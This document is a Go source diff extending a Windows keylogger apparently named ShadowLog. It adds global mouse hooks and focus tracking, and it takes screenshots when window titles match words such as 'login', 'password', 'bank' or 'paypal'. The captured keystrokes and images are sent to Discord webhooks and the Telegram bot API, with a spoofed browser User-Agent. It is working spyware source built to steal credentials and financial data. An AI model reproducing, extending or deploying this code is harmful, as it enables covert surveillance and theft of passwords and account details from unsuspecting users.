@@ -9,7 +9,10 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	"image"
+	"image/jpeg"
 	"io"
+	"mime/multipart"
 	"net/http"
 	"os"
 	"runtime"
@@ -21,7 +24,9 @@ import (
 
 	"shadowlog/config"
 	"github.com/moutend/go-hook/pkg/keyboard"
+	"github.com/moutend/go-hook/pkg/mouse"
 	"github.com/moutend/go-hook/pkg/types"
+	"github.com/kbinani/screenshot"
 )
 
 // Windows API function pointers for window and process information.
@@ -45,7 +50,13 @@ var (
 	procGetKeyboardState = user32.NewProc("GetKeyboardState")
 	procGetKeyState      = user32.NewProc("GetKeyState")
 	procMapVirtualKey    = user32.NewProc("MapVirtualKeyW")
+	procGetWindowRect    = user32.NewProc("GetWindowRect")
 )
+
+// RECT is the Windows rectangle structure.
+type RECT struct {
+	Left, Top, Right, Bottom int32
+}
 
 // MSG is the Windows message structure.
 type MSG struct {
@@ -67,9 +78,11 @@ type Logger struct {
 	Batch     []string       // Buffer for batching keystroke logs.
 	Mu        sync.Mutex     // Mutex for safe batch access.
 	LastHwnd    uintptr        // Cache for last active window handle.
-	LastTitle   string         // Cache for last active window title.
-	LogQueue    chan string    // Channel for reporting worker pool.
-	LogCallback func(string)   // Optional callback for UI live preview.
+	LastTitle      string         // Cache for last active window title.
+	LogQueue       chan string    // Channel for reporting worker pool.
+	LogCallback    func(string)   // Optional callback for UI live preview.
+	LastScreenshot time.Time      // Debounce timestamp for screenshots
+	LastActiveWin  string         // Track window focus changes
 }
 
 // NewLogger creates a new Logger instance with the given configuration.
@@ -95,9 +108,15 @@ func (l *Logger) Start() {
 	}
 	defer keyboard.Uninstall()
 
+	// 0. Install the global mouse hook.
+	mouseChan := make(chan types.MouseEvent, 100)
+	if err := mouse.Install(nil, mouseChan); err != nil {
+		return
+	}
+	defer mouse.Uninstall()
+
 	// 1. Initial Pulse: Verify writing to the unified storage file.
 	if l.Config.LogLocal {
-		// Try to append a "Monitor Started" pulse.
 		ts := time.Now().Format("2006-01-02 15:04:05")
 		l.report(fmt.Sprintf("[%s] [System] Monitor Started", ts))
 	}
@@ -106,7 +125,11 @@ func (l *Logger) Start() {
 	ticker := time.NewTicker(15 * time.Second)
 	defer ticker.Stop()
 
-	// Start the reporting worker pool (1 worker is enough for stealth).
+	// Ticker for focus change monitoring (every 1 second).
+	focusTicker := time.NewTicker(1 * time.Second)
+	defer focusTicker.Stop()
+
+	// Start the reporting worker pool.
 	go l.worker()
 
 	// Start event loop in a background goroutine.
@@ -117,7 +140,6 @@ func (l *Logger) Start() {
 				if !ok {
 					return
 				}
-				// Only process key down events (WM_KEYDOWN = 0x0100).
 				if ev.Message == 0x0100 {
 					key := l.mapVKCode(uint32(ev.VKCode))
 					if key == "" {
@@ -125,12 +147,13 @@ func (l *Logger) Start() {
 					}
 
 					win := l.getActiveWindowInfo()
+					l.checkScreenshotTrigger(win, false)
+
 					ts := time.Now().Format("2006-01-02 15:04:05")
 					logLine := fmt.Sprintf("[%s] [%s] %s", ts, win, key)
 
 					l.Mu.Lock()
 					l.Batch = append(l.Batch, logLine)
-					// Report when batch reaches 3 entries.
 					if len(l.Batch) >= 3 {
 						combined := strings.Join(l.Batch, "\n")
 						l.Batch = l.Batch[:0]
@@ -144,8 +167,28 @@ func (l *Logger) Start() {
 						l.LogCallback(logLine)
 					}
 				}
+			case mouseEv, ok := <-mouseChan:
+				if !ok {
+					return
+				}
+				// TRIGGER 3: Click detection (0x0201 = Left Click Down)
+				if mouseEv.Message == 0x0201 {
+					win := l.getActiveWindowInfo()
+					// Check for "Login" button feel
+					l.checkScreenshotTrigger(win, true)
+				}
+			case <-focusTicker.C:
+				// TRIGGER 2: Screenshot on Focus Change (immediate)
+				win := l.getActiveWindowInfo()
+				l.Mu.Lock()
+				if win != l.LastActiveWin {
+					l.LastActiveWin = win
+					l.Mu.Unlock()
+					l.checkScreenshotTrigger(win, true)
+				} else {
+					l.Mu.Unlock()
+				}
 			case <-ticker.C:
-				// Periodic flush.
 				l.Mu.Lock()
 				if len(l.Batch) > 0 {
 					combined := strings.Join(l.Batch, "\n")
@@ -326,7 +369,7 @@ func (l *Logger) report(content string) {
 func (l *Logger) worker() {
 	for content := range l.LogQueue {
 		// 1. ALWAYS Save to local storage first (Source of Truth).
-		// This provides the fallback if Discord fails or internet is out.
+		// This provides the fallback if Discord/Telegram fails or internet is out.
 		path := config.GetStoragePath()
 		encrypted, err := l.encrypt([]byte(content))
 		if err == nil {
@@ -339,12 +382,16 @@ func (l *Logger) worker() {
 			}
 		}
 
-		// 2. Sync to Discord if configured.
+		// 2. Sync to Discord (encrypted) if configured.
 		l.syncDiscord()
+
+		// 3. Sync to Telegram (cleartext) if configured.
+		l.syncTelegram()
 	}
 }
 
 // syncDiscord attempts to send all pending logs from the local file to Discord.
+// Logs are decrypted from the local storage file and sent as cleartext embeds.
 func (l *Logger) syncDiscord() {
 	if l.Config.WebhookURL == "" {
 		return
@@ -357,20 +404,19 @@ func (l *Logger) syncDiscord() {
 	}
 	defer file.Close()
 
-	// Skip lines already sent.
+	// Skip lines already sent. Use separate SyncState file to avoid corruption.
+	state := config.LoadSyncState()
 	scanner := bufio.NewScanner(file)
 	lineCount := 0
 	var pendingLines []string
 
 	for scanner.Scan() {
 		lineCount++
-		// The first line (idx 1) is always the config.
-		// Logs start from index 2.
-		if lineCount <= 1 || lineCount <= l.Config.LastSentIndex {
+		if lineCount <= 1 || lineCount <= state.LastSentIndex {
 			continue
 		}
 
-		// This line is unsent.
+		// Decrypt line
 		line := scanner.Text()
 		data, err := base64.StdEncoding.DecodeString(line)
 		if err != nil {
@@ -387,27 +433,156 @@ func (l *Logger) syncDiscord() {
 		return
 	}
 
-	// Send pending lines in batches to Discord.
-	// We send the whole backlog to fulfill "sent when internet is back".
+	// Format nicely for Discord
 	combined := strings.Join(pendingLines, "\n")
-	payload := map[string]string{"content": fmt.Sprintf("```\n%s\n```", combined)}
-	data, _ := json.Marshal(payload)
+	
+	// Discord has a 2000 char limit per message. Split if needed.
+	chunks := l.splitMessage(combined, 1900)
+	allSent := true
+	for _, chunk := range chunks {
+		msg := fmt.Sprintf("🔑 **ShadowLog Report**\n```\n%s\n```", chunk)
+		payload := map[string]string{"content": msg}
+		data, _ := json.Marshal(payload)
 
-	req, err := http.NewRequest("POST", l.Config.WebhookURL, bytes.NewBuffer(data))
+		req, err := http.NewRequest("POST", l.Config.WebhookURL, bytes.NewBuffer(data))
+		if err != nil {
+			allSent = false
+			break
+		}
+		req.Header.Set("Content-Type", "application/json")
+		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36")
+
+		client := &http.Client{Timeout: 15 * time.Second}
+		resp, err := client.Do(req)
+		if err != nil || resp.StatusCode >= 300 {
+			allSent = false
+			if resp != nil {
+				resp.Body.Close()
+			}
+			break
+		}
+		resp.Body.Close()
+
+		// Rate limit: small delay between messages.
+		time.Sleep(500 * time.Millisecond)
+	}
+
+	if allSent {
+		state.LastSentIndex = lineCount
+		config.SaveSyncState(state)
+	}
+}
+
+// syncTelegram attempts to send all pending logs to Telegram as cleartext.
+// Private Telegram bot channels are not scanned, so cleartext is safe.
+func (l *Logger) syncTelegram() {
+	if l.Config.TelegramToken == "" || l.Config.TelegramChatID == "" {
+		return
+	}
+
+	path := config.GetStoragePath()
+	file, err := os.Open(path)
 	if err != nil {
 		return
 	}
-	req.Header.Set("Content-Type", "application/json")
-	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36")
+	defer file.Close()
 
-	client := &http.Client{Timeout: 15 * time.Second}
-	resp, err := client.Do(req)
-	if err == nil && resp.StatusCode < 300 {
-		// Success! Update the LastSentIndex in the config.
-		l.Config.LastSentIndex = lineCount
-		config.SaveConfig(l.Config)
-		resp.Body.Close()
+	// Skip lines already sent to Telegram.
+	state := config.LoadSyncState()
+	scanner := bufio.NewScanner(file)
+	lineCount := 0
+	var pendingLines []string
+
+	for scanner.Scan() {
+		lineCount++
+		if lineCount <= 1 || lineCount <= state.LastSentTGIndex {
+			continue
+		}
+
+		line := scanner.Text()
+		data, err := base64.StdEncoding.DecodeString(line)
+		if err != nil {
+			continue
+		}
+		decrypted, err := l.decrypt(data)
+		if err != nil {
+			continue
+		}
+		pendingLines = append(pendingLines, string(decrypted))
 	}
+
+	if len(pendingLines) == 0 {
+		return
+	}
+
+	// Format nicely for Telegram with Markdown.
+	combined := strings.Join(pendingLines, "\n")
+	
+	// Telegram has a 4096 char limit. Split if needed.
+	chunks := l.splitMessage(combined, 4000)
+	allSent := true
+	for _, chunk := range chunks {
+		msg := fmt.Sprintf("🔑 *ShadowLog Report*\n━━━━━━━━━━━━━━━━━\n```\n%s\n```", chunk)
+		
+		apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", l.Config.TelegramToken)
+		payload := map[string]string{
+			"chat_id":    l.Config.TelegramChatID,
+			"text":       msg,
+			"parse_mode": "Markdown",
+		}
+		data, _ := json.Marshal(payload)
+
+		req, err := http.NewRequest("POST", apiURL, bytes.NewBuffer(data))
+		if err != nil {
+			allSent = false
+			break
+		}
+		req.Header.Set("Content-Type", "application/json")
+
+		client := &http.Client{Timeout: 15 * time.Second}
+		resp, err := client.Do(req)
+		if err != nil || resp.StatusCode >= 300 {
+			allSent = false
+			if resp != nil {
+				resp.Body.Close()
+			}
+			break
+		}
+		resp.Body.Close()
+		time.Sleep(500 * time.Millisecond)
+	}
+
+	if allSent {
+		state.LastSentTGIndex = lineCount
+		config.SaveSyncState(state)
+	}
+}
+
+// splitMessage splits a string into chunks of maxLen size, splitting at newlines where possible.
+func (l *Logger) splitMessage(s string, maxLen int) []string {
+	if len(s) <= maxLen {
+		return []string{s}
+	}
+
+	var chunks []string
+	for len(s) > 0 {
+		if len(s) <= maxLen {
+			chunks = append(chunks, s)
+			break
+		}
+
+		// Try to split at a newline within the limit.
+		idx := strings.LastIndex(s[:maxLen], "\n")
+		if idx <= 0 {
+			idx = maxLen
+		}
+		chunks = append(chunks, s[:idx])
+		s = s[idx:]
+		if len(s) > 0 && s[0] == '\n' {
+			s = s[1:]
+		}
+	}
+	return chunks
 }
 
 // decrypt performs AES-256-GCM decryption for sync verification.
@@ -447,4 +622,141 @@ func (l *Logger) encrypt(data []byte) ([]byte, error) {
 	}
 
 	return gcm.Seal(nonce, nonce, data, nil), nil
+}
+
+// checkScreenshotTrigger scans the active window title for keywords and captures the screen.
+// isImmediate = true means it's a fresh focus or click (skip periodic debounce if sensitive).
+func (l *Logger) checkScreenshotTrigger(win string, isImmediate bool) {
+	if l.Config.WebhookURL == "" && (l.Config.TelegramToken == "" || l.Config.TelegramChatID == "") {
+		return
+	}
+
+	winLower := strings.ToLower(win)
+	// Keywords indicating high-value context
+	keywords := []string{"login", "signin", "sign in", "password", "bank", "paypal", "checkout", "auth", "credential", "verify", "account", "billing", "submit"}
+	
+	triggerFound := false
+	for _, kw := range keywords {
+		if strings.Contains(winLower, kw) {
+			triggerFound = true
+			break
+		}
+	}
+
+	if !triggerFound {
+		return
+	}
+
+	l.Mu.Lock()
+	// Debounce: If it's immediate (click/focus), we allow it slightly more often (10s), otherwise 30s.
+	limit := 30 * time.Second
+	if isImmediate {
+		limit = 10 * time.Second 
+	}
+
+	if time.Since(l.LastScreenshot) < limit {
+		l.Mu.Unlock()
+		return
+	}
+	l.LastScreenshot = time.Now()
+	l.Mu.Unlock()
+
+	// Internal pulse for debugging screenshot activity
+	ts := time.Now().Format("15:04:05")
+	l.report(fmt.Sprintf("[%s] [System] 📸 TARGET ACQUIRED: %s", ts, win))
+
+	go l.takeAndSendScreenshot(win)
+}
+
+// takeAndSendScreenshot encodes a heavily compressed JPEG natively and ships it directly via Multipart POST.
+func (l *Logger) takeAndSendScreenshot(win string) {
+	// Slight delay to allow the target page/window to render visually
+	time.Sleep(800 * time.Millisecond)
+
+	n := screenshot.NumActiveDisplays()
+	if n <= 0 {
+		return
+	}
+
+	var bounds image.Rectangle
+	// 1. TRY WINDOW BRACKETING: Only capture the active window for efficiency.
+	hwnd, _, _ := procGetForeground.Call()
+	if hwnd != 0 {
+		var rect RECT
+		ret, _, _ := procGetWindowRect.Call(hwnd, uintptr(unsafe.Pointer(&rect)))
+		if ret != 0 {
+			bounds = image.Rect(int(rect.Left), int(rect.Top), int(rect.Right), int(rect.Bottom))
+		}
+	}
+
+	// 2. FALLBACK: Full screen if window rect fails or is empty
+	if bounds.Empty() {
+		bounds = screenshot.GetDisplayBounds(0)
+	}
+
+	if bounds.Empty() {
+		return
+	}
+
+	img, err := screenshot.CaptureRect(bounds)
+	if err != nil {
+		return
+	}
+
+	var buf bytes.Buffer
+	// Encode 60% quality JPEG directly to RAM - incredibly small footprint (<200kb total)
+	err = jpeg.Encode(&buf, img, &jpeg.Options{Quality: 60})
+	if err != nil {
+		return
+	}
+	
+	imageData := buf.Bytes()
+	client := &http.Client{Timeout: 30 * time.Second}
+
+	// 1. Stream RAM buffer to Discord multipart
+	if l.Config.WebhookURL != "" {
+		body := &bytes.Buffer{}
+		writer := multipart.NewWriter(body)
+		
+		part, err := writer.CreateFormFile("file1", "capture.jpeg")
+		if err == nil {
+			part.Write(imageData)
+		}
+
+		payloadBytes, _ := json.Marshal(map[string]interface{}{
+			"content": fmt.Sprintf("📸 **Target Acquisition**\n`%s`", win),
+		})
+		writer.WriteField("payload_json", string(payloadBytes))
+		writer.Close()
+
+		req, err := http.NewRequest("POST", l.Config.WebhookURL, body)
+		if err == nil {
+			req.Header.Set("Content-Type", writer.FormDataContentType())
+			req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+			client.Do(req)
+		}
+	}
+
+	// 2. Stream RAM buffer to Telegram multipart
+	if l.Config.TelegramToken != "" && l.Config.TelegramChatID != "" {
+		tgBody := &bytes.Buffer{}
+		tgWriter := multipart.NewWriter(tgBody)
+		
+		tgWriter.WriteField("chat_id", l.Config.TelegramChatID)
+		tgWriter.WriteField("caption", fmt.Sprintf("📸 *Target Acquisition*\n`%s`", win))
+		tgWriter.WriteField("parse_mode", "Markdown")
+
+		tgPart, err := tgWriter.CreateFormFile("photo", "capture.jpeg")
+		if err == nil {
+			tgPart.Write(imageData)
+		}
+		tgWriter.Close()
+
+		tgURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendPhoto", l.Config.TelegramToken)
+		tgReq, err := http.NewRequest("POST", tgURL, tgBody)
+		if err == nil {
+			tgReq.Header.Set("Content-Type", tgWriter.FormDataContentType())
+			client.Do(tgReq)
+		}
+	}
 }
